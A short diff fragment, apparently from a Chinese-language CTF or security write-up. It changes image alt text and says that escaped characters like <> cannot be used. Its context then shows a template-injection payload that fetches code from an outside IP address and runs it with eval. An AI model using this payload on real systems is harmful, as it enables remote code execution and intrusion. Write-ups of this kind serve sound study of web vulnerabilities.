@@ -108,9 +108,9 @@ if !profileRegex.MatchString(registerInfo.Profile) {
 
 而且不能够出现`<>`这些被转义的字符
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
 ```
 {{fetch('http://27.25.151.48:51008/').then(t=>t.text()).then(eval)}}
